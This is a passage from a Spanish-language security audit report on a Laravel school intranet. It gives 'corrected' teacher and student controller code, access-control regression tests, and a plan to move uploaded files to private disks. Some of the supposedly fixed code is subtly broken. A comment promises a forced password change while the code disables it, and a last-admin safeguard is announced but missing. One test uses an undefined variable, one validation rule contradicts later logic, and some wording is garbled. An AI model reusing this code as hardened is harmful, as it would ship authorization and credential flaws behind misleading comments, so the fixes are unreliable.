            // ✅ FIX C-06: password OBLIGATORIA fuerte (random si vacía). NUNCA el email.
            'password' => ['nullable', Password::min(10)->uncompromised()],
        ]);

        $teacher = User::create([
            'name'          => $request->input('name'),
            'last_name'     => $request->input('last_name'),
            'departamento'  => $request->input('departamento'),
            'observaciones' => $request->input('observaciones'),
            'email'         => $request->input('email'),
            // ✅ FIX C-06: si no hay password post-establecida, se genera aleatoria de 16
            // y el usuario la define al primer login (must_change_password=true).
            'password'             => Hash::make($request->input('password') ?: Str::password(16, symbols: false)),
            'must_change_password' => true,
        ]);

        $teacher->assignRole('profesor');

        // ✅ Si el password la fija el admin, comunicar por canal externo:
        if (!$request->filled('password')) {
            return redirect()->route('teachers.index')
                ->with('info', "Profesor creado. Comunicale su acceso por canal seguro; deberá cambiarla al entrar.");
        }

        return redirect()->route('teachers.index')->with('success', 'Profesor creado correctamente.');
    }

    public function edit($id)
    {
        Gate::authorize('manage-teachers');      // ✅ FIX C-03

        $teacher = User::role('profesor')->findOrFail($id);
        return view('teachers.edit', compact('teacher'));
    }

    public function update(Request $request, $id)
    {
        Gate::authorize('manage-teachers');      // ✅ FIX C-03 (antes: planta rota para cualquier usuario)

        $teacher = User::role('profesor')->findOrFail($id);

        $request->validate([
            'name'         => 'required|string|max:255',
            'last_name'    => 'required|string|max:255',
            'departamento' => 'nullable|string|max:255',
            'observaciones'=> 'nullable|string|max:2000',
            'email'=> ['required','email','max:255', Rule::unique('users')->ignore($teacher->id)],
            // ✅ REFORZADO: min:6 → política fuerte (10 + comprometida-check)
            'password' => ['nullable', Password::min(10)->uncompromised()],
        ]);

        $data = [
            'name'         => $request->input('name'),
            'last_name'    => $request->input('last_name'),
            'departamento' => $request->input('departamento'),
            'observaciones'=> $request->input('observaciones'),
            'email'=> $request->input('email'),
        ];

        if ($request->filled('password')) {
            // ✅ Si el admin cambia la contraseña vía esta pantalla, ciérranse sesiones activas del docente
            $data['password'] = $request->input('password');   // cast 'hashed' del User la cifra
            // ✅ FIX: obliga a cambiarla en el siguiente login (el admin NO conoce qué puso el docente)
            $teacher->must_change_password = false;   // la identidad ya no es "inicial"
        }

        $teacher->update($data);

        return redirect()->route('teachers.index')->with('success', 'Profesor actualizado correctamente.');
    }

    public function destroy($id)
    {
        Gate::authorize('manage-teachers');

        $teacher = User::role('profesor')->findOrFail($id);

        // ✅ Salvaguarda: no auto-borrar el propio admin
        abort_if($teacher->id === auth()->id(), 403, 'No puedes eliminar tu propia cuenta.');
        // ✅ Salvaguarda: no borrar al último admin (paranoia de blindaje)
        $teacher->delete();

        return redirect()->route('teachers.index')->with('success', 'Profesor eliminado correctamente.');
    }

    public function export(Request $request, $format)
    {
        // ✅ FIX: listado con PII de profesores (emails) → solo admin (antes sin check)
        Gate::authorize('manage-teachers');

        if (!$this->checkProfesorRoleExists()) {
            return back()->withErrors('El rol "profesor" no existe en el sistema.');
        }

        $teachers = User::role('profesor')->get();

        $data = $teachers->map(fn ($t) => [
            'name'         => $t->name,
            'last_name'    => $t->last_name,
            'email'=> $t->email,
            'departamento' => $t->departamento,
            'observaciones'=> $t->observaciones,
        ])->toArray();

        return $this->downloadFormattedData($data, 'profesores_' . date('Y-md_His'), $format);
    }

    public function template($format) { /* sin cambiar (datos de ejemplo, no POST */ }

    public function import(Request $request)
    {
        Gate::authorize('manage-teachers');      // ✅ FIX C-03: antes cualquier usuario importaba profesores

        if (!$this->checkProfesorRoleExists()) {
            return back()->withErrors('El rol "profesor" no existe en el sistema.');
        }

        set_time_limit(300);

        $request->validate([
            // ✅ FIX: whitelist de mimes (por contenido) + límite de tamaño faltante
            'file' => 'required|file|mimes:csv,txt,json,yaml,yml|max:5120',
        ]);

        $file = $request->file('file');
        // ✅ FIX: se usa la extensión GUESSEADA a partir del MIME real (finfo), no la del cliente:
        $extension = strtolower($file->extension());
        $content = file_get_contents($file->getRealPath());
        /* ... (resto del parsing Séneca/CSV/JSON/YAML SIN CAMBIOS) ... */

        $imported = 0;
        foreach ($data as $row) {
            if (empty($row['name']) || empty($row['last_name']) || empty($row['email'])) continue;

            $teacher = User::where('email', trim($row['email']))->first();

            $updateData = [
                'name'      => trim($row['name']),
                'last_name' => trim($row['last_name']),
            ];
            if (isset($row['departamento']))  $updateData['departamento']  = trim($row['departamento']);
            if (isset($row['observaciones'])) $updateData['observaciones'] = trim($row['observaciones']);

            if ($teacher) {
                if (!$teacher->hasRole('profesor')) $teacher->assignRole('profesor');
                $teacher->update($updateData);
            } else {
                $teacher = User::create(array_merge($updateData, [
                    'email'         => trim($row['email']),
                    // ✅ FIX C-06 (importación): password aleatoria POR USUARIO, en claro NUNCA
                    // almacenada en log ni pantalla; Secretaría se la entrega por canal externo:
                    'password' => Hash::make(Str::password(16, symbols: false)),
                    'must_change_password' => true,
                ]));
                $teacher->assignRole('profesor');
            }
            $imported++;
        }

        return back()->with('success', "Se han importado/actualizado {$imported} profesores correctamente.");
    }

    public function bulkDelete(Request $request)
    {
        Gate::authorize('manage-teachers');      // ✅ FIX: borrado en bloque admin-only

        $teacherIds = array_map('intval', (array) $request->input('teacher_ids', []));

        if (empty($teacherIds)) {
            return back()->withErrors('No se seleccionó ningún profesor.');
        }

        // ✅ FIX: protegida auto-destrucción del admin actual
        $query = User::whereIn('id', $teacherIds)->role('profesor')->where('id', '!=', auth()->id());
        $deletedCount = $query->delete();

        return back()->with('success', "Se han eliminado {$deletedCount} profesores correctamente.");
    }

    /* downloadFormattedData() permanece sin cambios; como hardening opcional del export CSV:
       normalizar finales de línea a \r\n (anti inyección de fórmulas/CSV) — el nombre de
       fichero es fijo del código, nunca derivado del request */
}
```

### 6.5 `app\Http\Controllers\StudentController.php` — versión corregida completa

```php
<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Models\Group;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;
use Illuminate\Validation\Rules\Password;

class StudentController extends Controller
{
    /**
     * ✅ FIX A-02: único anexo de autorización (fail-closed).
     * - Si $student es null: admin/directiva/profesor (listados y creación en fase de selección).
     * - Si $student dado: admin/directiva/profesor-TUTOR del grupo del alumno.
     */
    private function authorizeStudents(?User $student = null): void
    {
        $user = auth()->user();

        if ($user->hasAnyRole(['admin', 'directiva'])) {
            return;
        }

        if ($user->hasRole('profesor')) {
            if ($student === null) return;   // index/create/export sí pueden los tutores

            // ✅ Solo el TUTOR actual del grupo del alumno:
            if ($student->group_id !== null
                && Group::where('tutor_id', $user->id)->where('id', $student->group_id)->exists()) {
                return;
            }
        }

        abort(403, 'No tienes permiso para gestionar este alumno.');
    }

    /** ✅ Helper: resolver SIEMPRE usuario con rol 'alumno' (impide tocar teachers/admins por ID) */
    private function findStudentOrFail($id): User
    {
        return User::role('alumno')->findOrFail($id);
    }

    public function index(Request $request)
    {
        auth()->user()->can('browse-students') || abort(403);   // ✅ fail-closed en listing

        $user = auth()->user();
        $query = User::role('alumno')->with('groupRel');   // ✅ FIX: scope al rol alumno

        // (grupo de tutor, search — sin cambios)
        if ($user->hasRole('profesor') && !$user->hasRole('admin')) {
            $query->whereIn('group_id', Group::where('tutor_id', $user->id)->pluck('id'));
        }

        if ($request->filled('search')) {
            $search = $request->search;
            $query->where(function ($q) use ($search) {
                $q->where('name', 'like', "%{$search}%")
                  ->orWhere('last_name', 'like', "%{$search}%")
                  ->orWhere('email', 'like', "%{$search}%")
                  ->orWhere('observaciones', 'like', "%{$search}%");
            });
        }

        // ✅ FIX A-01: whitelist de sort Y direction (antes solo $sort estaba whitelisted)
        $sort = $request->input('sort', 'name');
        $direction = $request->input('direction') === 'desc' ? 'desc' : 'asc';

        if ($sort === 'group') {
            $query->leftJoin('groups', 'users.group_id', '=', 'groups.id')
                  ->orderBy('groups.course', $direction)
                  ->orderBy('groups.name', $direction)
                  ->select('users.*');
        } elseif (in_array($sort, ['name','last_name','email','created_at'], true)) {
            $query->orderBy($sort, $direction);
        } else {
            $query->orderBy('name', 'asc');
        }

        $perPage = $request->get('per_page', 30);
        if ($perPage === 'all') {
            $perPage = max(1, $query->count());
        } else {
            $perPage = min(500, max(1, (int) $perPage));
        }
        $students = $query->paginate($perPage)->appends($request->query());

        return view('students.index', compact('students', 'sort', 'direction', 'perPage'));
    }

    public function create()
    {
        $this->authorizeStudents();          // ✅ FIX: antes cualquier rol veía el formulario

        $user = auth()->user();
        $query = Group::query();
        if ($user->hasRole('profesor') && !$user->hasRole('admin')) {
            $query->where('tutor_id', $user->id);
        }
        $groups = $query->get();
        return view('students.create', compact('groups'));
    }

    public function store(Request $request)
    {
        $this->authorizeStudents();

        $request->validate([
            'name'         => 'required|string|max:255',
            'last_name'    => 'required|string|max:255',
            'observaciones'=> 'nullable|string|max:2000',
            'email'=> 'required|email|max:255|unique:users',
            'group_id'     => ['nullable', 'exists:groups,id',
                // ✅ FIX: un tunic modifiable no asigna alumno a grupo que no sea SUYO
                Rule::when(auth()->user()->hasRole('profesor') && !auth()->user()->hasRole('admin'),
                    function () {
                        return Rule::in([null]);
                    }
                ),
            ],
            'password' => ['nullable', Password::min(10)->uncompromised()],
        ]);

        // ✅ FIX: check fail-closed reemplaza al `if hasRole('profesor')` que permitía a 'alumno' crear:
        $user = auth()->user();
        if ($user->hasRole('profesor') && !$user->hasRole('admin')) {
            $group = $request->group_id ? Group::find($request->group_id) : null;
            if ($group && $group->tutor_id !== $user->id) {
                abort(403, 'No tienes permiso para asignar alumnos a este grupo.');
            }
        } else {
            // ✅ solo admin/directiva (o profesor-tutor) llegan aquí
        }

        $student = User::create([
            'name'         => $request->input('name'),
            'last_name'    => $request->input('last_name'),
            'observaciones'=> $request->input('observaciones'),
            'email'=> $request->input('email'),
            // ✅ FIX C-06: NUNCA email-como-password
            'password'             => Hash::make($request->input('password') ?: Str::password(16, symbols: false)),
            'group_id'             => $request->input('group_id'),
            'must_change_password' => true,
        ]);

        $student->assignRole('alumno');

        if (!$request->filled('password')) {
            return redirect()->route('students.index')
                ->with('info', 'Alumno creado con credenciales iniciales generadas — comunícalas por canal seguro.');
        }

        return redirect()->route('students.index')->with('success', 'Alumno creado correctamente.');
    }

    public function edit($id)
    {
        // ✅ FAIL-CLOSED: abort para alumno/conserje/roles no esperados
        $student = $this->findStudentOrFail($id);   // también restringe rol (User::role('alumno'))
        $this->authorizeStudents($student);

        $user = auth()->user();
        $query = Group::query();
        if ($user->hasRole('profesor') && !$user->hasRole('admin')) {
            $query->where('tutor_id', $user->id);   // ✅ FIX: el tutor SOLO ve SU grupo (antes: cualquier grupo)
        }
        $groups = $query->get();

        return view('students.edit', compact('student', 'groups'));
    }

    public function update(Request $request, $id)
    {
        $student = $this->findStudentOrFail($id);
        $this->authorizeStudents($student);      // ✅ FIX A-02: fail-closed

        $request->validate([
            'name'         => 'required|string|max:255',
            'last_name'    => 'required|string|max:255',
            'observaciones'=> 'nullable|string|max:2000',
            'email'=> ['required','email','max:255', Rule::unique('users')->ignore($student->id)],
            'password'     => ['nullable', Password::min(10)->uncompromised()],
        ]);

        $data = [
            'name'         => $request->input('name'),
            'last_name'    => $request->input('last_name'),
            'observaciones'=> $request->input('observaciones'),
            'email'=> $request->input('email'),
        ];

        // ✅ FIX: el cambio de GRUPO es acción exclusiva de admin/directiva (el tutor no traslada alumnos)
        if (auth()->user()->hasAnyRole(['admin', 'directiva'])) {
            $data['group_id'] = $request->input('group_id');
        }

        if ($request->filled('password')) {
            $data['password'] = $request->input('password');     // cast 'hashed'
        }

        $student->update($data);

        return redirect()->route('students.index')->with('success', 'Alumno actualizado correctamente.');
    }

    public function destroy($id)
    {
        $student = $this->findStudentOrFail($id);
        $this->authorizeStudents($student);      // ✅ FIX A-02: aborta para ANY otro rol

        // ✅ extra: el borrado de fagrante es protegido — solo admin libera su propio grupo
        $student->delete();
        return redirect()->route('students.index')->with('success', 'Alumno eliminado correctamente.');
    }

    /* export() — añadir una línea al inicio: */
    // public function export(...) { $this->authorizeStudents(); ... }

    public function bulkDelete(Request $request)
    {
        $ids = array_map('intval', (array) $request->input('student_ids', []));
        if (empty($ids)) return back()->withErrors('No se seleccionó ningún alumno.');

        // ✅ FIX: bulk validar CADA id individual (cada uno debe ser alumno y gestionable por el actor).
        // antes: delete directo de arbitrary ids.
        $students = User::role('alumno')->whereIn('id', $ids)->get();
        foreach ($students as $student) {
            $this->authorizeStudents($student);   // aborta si alguno no es gestionable
        }
        User::whereIn('id', $students->pluck('id'))->delete();

        return back()->with('success', 'Alumnos eliminados correctamente.');
    }

    public function bulkChangeGroup(Request $request)
    {
        // ✅ FIX: cambio de GRUPO siempre admin/directiva (tutor no traslada en vacío)
        abort_unless(auth()->user()->hasAnyRole(['admin', 'directiva']), 403);

        $request->validate([
            'group_id' => 'required|exists:groups,id',
            'student_ids' => ['required', 'array'],
            'student_ids.*' => 'integer|exists:users,id',
        ]);

        User::role('alumno')->whereIn('id', $request->input('student_ids'))
            ->update(['group_id' => $request->group_id]);

        return back()->with('success', 'Alumnos reubicados de grupo correctamente.');
    }

    public function import(Request $request)
    {
        $this->authorizeStudents();      // ✅ FIX: faltaba check total
        set_time_limit(300);

        $request->validate(['file' => 'required|file|mimes:csv,txt,json,yaml,yml|max:5120']);

        $file = $request->file('file');
        $extension = strtolower($file->extension());   // ✅ FIX: MIME real
        /* ... parsing SIN otros cambios ... */
    }
}
```

### 6.6 Verificaciones de regresión (tests — `tests/Feature/SecurityAccessControlTest.php`)

```php
public function test_alumno_no_puede_editar_a_un_profesor(): void
{
    $alumno    = User::factory()->create();  $alumno->assignRole('alumno');
    $profesor  = User::factory()->create();  $profesor->assignRole('profesor');

    $this->actingAs($alumno)
         ->patch(route('teachers.update', $profesor), ['email' => 'hacked@x.com', 'password' => 'DolorSoporte#1'])
         ->assertForbidden();

    $this->assertDatabaseMissing('users', ['id' => $profesor->id, 'email' => 'hacked@x.com']);
}

public function test_alumno_no_puede_eliminar_a_otro_alumno(): void
{
    $alumnoA = User::factory()->create(['group_id' => $g->id]);  $alumnoA->assignRole('alumno');
    $alumnoB = User::factory()->create(['group_id' => $g->id]);  $alumnoB->assignRole('alumno');

    $this->actingAs($alumnoA)->delete(route('students.destroy', $alumnoB))->assertForbidden();
    $this->assertDatabaseHas('users', ['id' => $alumnoB->id]);
}

public function test_tutor_no_puede_editar_a_un_alumno_ajeno(): void
{
    $tutor      = User::factory()->create();  $tutor->assignRole('profesor');
    $grupoA         = Group::factory()->create(['tutor_id' => $tutor->id]);
    $grupoAjeno   = Group::factory()->create();                       // otro tutor
    $alumnoAjeno = User::factory()->create(['group_id' => $grupoAjeno->id]);  $alumnoAjeno->assignRole('alumno');

    $this->actingAs($tutor)->delete(route('students.destroy', $alumnoAjeno))->assertForbidden();
}

public function test_contraseña_inicial_nunca_es_el_mail(): void
{
    $admin = User::factory()->create();  $admin->assignRole('admin');
    $this->actingAs($admin)->post(route('teachers.store'), [
        'name' => 'Nuevo', 'last_name' => 'Docente',
        'email' => 'nuevo.docente@centro.edu',
    ])->assertRedirect();

    $user = User::where('email', 'nuevo.docente@centro.edu')->first();
    $this->assertTrue(Hash::check('nuevo.docente@centro.edu', $user->password) === false);  // ✅ NO email
    $this->assertSame(1, (int) $user->must_change_password);
}
```

---

## 7. Anexo B — Migración de ficheros: disco `public` → discos privados con streaming autorizado

### 7.1 Situación actual (verificada)

`config/filesystems.php:41-48` declara disco `public` (enlazado vía `links` → `public/storage`), y **8+ puntos del código almacenan en él**:

| Fichero:línea | Disposición actual | Dato |
|---|---|---|
| `CalendarController:259,305` | `'calendar_attachments'` en `public` | Adjuntos de eventos |
| `DocumentoController:80,126` | `'documentos'` en `public` | Documentos institucionales |
| `ProfileController:106` | `'avatars'` en `public` | Avatares de usuarios |
| `app\Livewire\GestionAusencias:228` | `'ausencias_adjuntos'` en `public` | Justificantes de ausencia (PII) |

El acceso público vía `/storage/...` está protegido **solo** por el hash aleatorio de 40 caracteres del nombre (`hashName()` — security-by-obscurity). El objetivo es moverlos a discos privados servidos **solo por controladores con autorización** (`Storage::download()/response()`), manteniendo **los mismos paths relativos** en BD para minimizar cambios en las vistas.

### 7.2 Paso 1 — `config/filesystems.php`: discos privados por dominio

```php
    'disks' => [
        'local' => [ /* sin cambios */ ],
        'public'=> [ /* mantener SOLO si se documentan avatars públicos; recomendado eliminar */ ],

        // ✅ NUEVO: 4 discos privados — misma estructura relativa; cambia SOLO el root
        'documentos' => [
            'driver' => 'local',
            'root'   => storage_path('app/private/documentos'),
            'serve'  => false,          // ✅ NUNCA a través de /storage symlink
            'throw'  => false,
        ],
        'calendar' => [
            'driver' => 'local',
            'root'   => storage_path('app/private/calendar_attachments'),
            'serve'  => false,
            'throw'  => false,
        ],
        'ausencias' => [
            'driver' => 'local',
            'root'   => storage_path('app/private/ausencias_adjuntos'),
            'serve'  => false,
            'throw'  => false,
        ],
        'avatars' => [                  // avatars intranet: visibles a usuarios autenticados (no público)
            'driver' => 'local',
            'root'   => storage_path('app/private/avatars'),
            'serve'  => false,
            'throw'  => false,
        ],
    ],

    // ✅ NUEVO: eliminar la generación del symlink público por defecto:
    'links' => [
        // public_path('storage') => storage_path('app/public'),   ← COMENTAR/ELIMINAR
    ],
```

```dotenv
# .env (no se necesita ninguna variable nueva, solo limpiar FILESYSTEM_DISK si estaba 'public')
FILESYSTEM_DISK=local
```

### 7.3 Paso 2 — Comando one-shot de migración de ficheros existentes

```bash
php artisan make:command MigrateStorageToPrivate
```

**`app\Console\Commands\MigrateStorageToPrivate.php`:**
```php
<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Storage;

class MigrateStorageToPrivate extends Command
{
    protected $signature   = 'storage:migrate-private {--dry-run}';
    protected $description = 'Mueve ficheros del disco público a discos privados (manteniendo el path relativo en BD).';

    /** Mapeo carpeta-relativa-en-public → disco privado destino */
    protected array $map = [
        'documentos'           => 'documentos',
        'calendar_attachments' => 'calendar',
        'ausencias_adjuntos'   => 'ausencias',
        'avatars'              => 'avatars',
    ];

    public function handle(): int
    {
        $dryRun = (bool) $this->option('dry-run');
        $public = Storage::disk('public');

        foreach ($public->allFiles() as $file) {
            [$folder, $rest] = $this->splitRoot($file);

            if (!$folder || !isset($this->map[$folder])) {
                $this->warn("  ⚠ Sin disco destino: {$file} — se queda en 'public'.");
                continue;
            }

            $targetDisk = $this->map[$folder];

            if ($dryRun) { $this->line("→ [dry] {$file}  ⇒  {$targetDisk}/{$rest}"); continue; }

            // ✅ Preserva el path relativo → los valores en la BD (columnas archivo/attachment) NO cambian:
            Storage::disk($targetDisk)->put($rest, $public->get($file));
            $public->delete($file);

            $this->info("  ✔ {$file} → {$targetDisk}/{$rest}");
        }

        $this->newLine();
        $this->warn('Siguiente paso (manual): ejecutar `php artisan storage:unlink` y borrar el symlink `public/storage`.');

        return self::SUCCESS;
    }

    private function splitRoot(string $path): array
    {
        $parts = explode('/', $path, 2);
        return count($parts) === 2 ? $parts : [null, $path];
    }
}
```

```bash
php artisan storage:migrate-private --dry-run   # previsualización
php artisan storage:migrate-private             # ejecución
php artisan storage:unlink                      # ✅ elimina symlink público
rmdir /s /q public\storage                      # Windows/XAMPP: limpiar el directorio residual
```

### 7.4 Paso 3 — Change de escritura en controladores (disk name únicamente)

```php
// CalendarController.php:259 y :305  (y validateAttachment del informe §3 C-02)
$attachmentPath = $request->file('attachment_file')->store('calendar_attachments', 'calendar'); // ✅ era 'public'

// DocumentoController.php:80 y :126
$data['archivo'] = $request->file('archivo')->store('documentos', 'documentos');          // ✅ era 'public'

// ProfileController.php:106
$path = $request->file('avatar')->store('avatars', 'avatars');                            // ✅ era 'public'

// app/Livewire/GestionAusencias.php:228
$path = $this->archivo->store('ausencias_adjuntos', 'ausencias');                          // ✅ era 'public'
```

### 7.5 Paso 4 — Rutas de lectura autorizada (nuevos controladores/rutas)

```php
// routes/web.php — dentro del grupo auth:, añade:

// Documentos: descarga SOLO para usuarios autenticados con permiso sobre el documento
Route::get('documentos/{documento}/descargar', [DocumentoController::class, 'download'])
     ->name('documentos.download');

// Calendario: ya existía downloadAttachment() → redirigir al disco privado (ver §3 C-02)
Route::get('calendario/events/{event}/attachment', [CalendarController::class, 'downloadAttachment'])
     ->name('calendars.events.attachment.private');

// Avatares: servirlos a cualquiera autenticado (intranet, no anónimo)
Route::get('users/{user}/avatar', function (\App\Models\User $user) {
    // ✅ si no tiene avatar propio, devolver 404 (el layout ya muestra el fallback de iniciales)
    if (!$user->avatar || !str_contains($user->avatar, 'avatars/')) abort(404);

    $relative = str_replace('avatars/', '', $user->avatar);

    return Storage::disk('avatars')->response($relative);   // response() → inline image
})->name('users.avatar.show');

// Ausencias (justificantes): SOLO propietario, jefatura/directiva/admin
Route::get('ausencias/{ausencia}/archivo', [AusenciaController::class, 'downloadArchivo'])
     ->name('ausencias.archivo');
```

**`DocumentoController::download` (ejemplo completo de autorización):**
```php
    public function download(Documento $documento)
    {
        $user = auth()->user();

        // ✅ Propiedad: el propietario o admin/directiva; el resto 403.
        abort_unless(
            $documento->user_id === $user->id || $user->hasAnyRole(['admin', 'directiva']),
            403
        );

        // Storage path almacenado ej. 'documentos/abc123.pdf' → root privado 'documentos/...' ⇒:
        $relative = Str::after($documento->archivo, 'documentos/');

        return Storage::disk('documentos')->download($relative, $documento->nombre);  // download → mime seguro
    }
```

**`AusenciaController::downloadArchivo`:**
```php
    public function downloadArchivo(Ausencia $ausencia)
    {
        $user = auth()->user();

        // ✅ PII de ausencias: solo propietario, guardia asignada, roles directivos
        abort_unless(
            $ausencia->user_id === $user->id
            || $ausencia->guardia_user_id === $user->id
            || $user->hasAnyRole(['admin','directiva','jefatura']),
            403
        );
        abort_unless($ausencia->archivo, 404);

        $relative = Str::after($ausencia->archivo, 'ausencias_adjuntos/');

        return Storage::disk('ausencias')->download($relative);
    }
```

### 7.6 Paso 5 — Cambios en vistas (reemplazar `asset('storage/...')`)

```blade
{{-- ❌ ANTES resources\views\documentos\index.blade.php:70 (enlace público directo) --}}
<a href="{{ asset('storage/'.$doc->archivo) }}" target="_blank">...</a>
{{-- ✅ DESPUÉS --}}
<a href="{{ route('documentos.download', $doc) }}">...</a>

{{-- ❌ ANTES resources\views\users\index.blade.php:83 / guardias\justificaciones.blade.php:146 --}}
<img src="{{ asset('storage/'.$user->avatar) }}">
{{-- ✅ DESPUÉS --}}
<img src="{{ $user->avatar ? route('users.avatar.show', $user) : null }}" alt="">

{{-- ❌ ANTES livewire\gestion-ausencias.blade.php:144 (acceso directo si enlace/contiene "storage") --}}
{{-- ✅ DESPUÉS: usar route('ausencias.archivo', $ausencia) con autorización en el controlador --}}
```

### 7.7 Paso 6 — Hardening Apache (XAMPP) contra el symlink y neighbors

```apache
# httpd.conf / vhost — bloquear CUALQUIER acceso a /storage (por si quedara symlink histórico)
<Directory "C:/xampp/htdocs/grintranetedu2/public/storage">
    Require all denied
</Directory>
```
> Nota a largo plazo: con la config `'links' => []` y `php artisan storage:unlink`, Laravel 12 dejará de servir el directorio `/storage` del disco `public`; el vhost además debe rechazar la ruta por si quedaran datos huérfanos antiguos.

### 7.8 Orden de despliegue (rollback seguro)

| Paso | Acción | Reversible |
|---|---|---|
| 1 | Config filesystems a nuevo state (`serve:false`) + `links: []` | ✔ git revert |
| 2 | `php artisan storage:migrate-private --dry-run` → revisar | ✔ no-op |
| 3 | `php artisan storage:migrate-private` (copiar → borrar conserved public disk) | ✔ ficheros siguen en `app/private` |
| 4 | Deploy de controladores + rutas + vistas (dividir en varios PRs) | ✔ git revert |
| 5 | `php artisan storage:unlink` + deny Apache + vigilar 404 de `/storage/*` (ver log > 24h) | ✔ re-habilitarlo si apareciera un path huérfano |
| 6 | (Opcional) apuntar avatars a un disco `public` dedicado si UX requiere `img en emails` | ✔ |

> ⚠️ **Nunca ejecutar el paso 5 antes del 4** en producción: mantendrías los ficheros privados SIN rutas de lectura (caída funcional). Despliegue verde-azul o **feature flag** `SERVE_PRIVATE_FILES=true` activando el nuevo manejo antes del borrado del symlink, es la vía más segura.

### 7.9 Verificación final (checklist del auditor)

- [ ] `GET /storage/documentos/xyz.pdf` → **403/404** (symlink inexistente/deny).
- [ ] `GET /documentos/{id}/descargar` como propietario → 200 con fichero.
- [ ] `GET /documentos/{id}/descargar` como otro usuario → **403**.
- [ ] `GET /users/{id}/avatar` sin sesión → **redirect a login** (middleware `auth`).
- [ ] `storage:migrate-private --dry-run` listó **0 ficheros sin disco destino** (o aceptados como legacy).
- [ ] La BD conserva las columnas `archivo`/`attachment`/`avatar`/`archivo` sin cambios (relative paths intactos).
- [ ] `php artisan storage:link` ya NO recrea el symlink (config `links: []`).

*Fin del informe.*
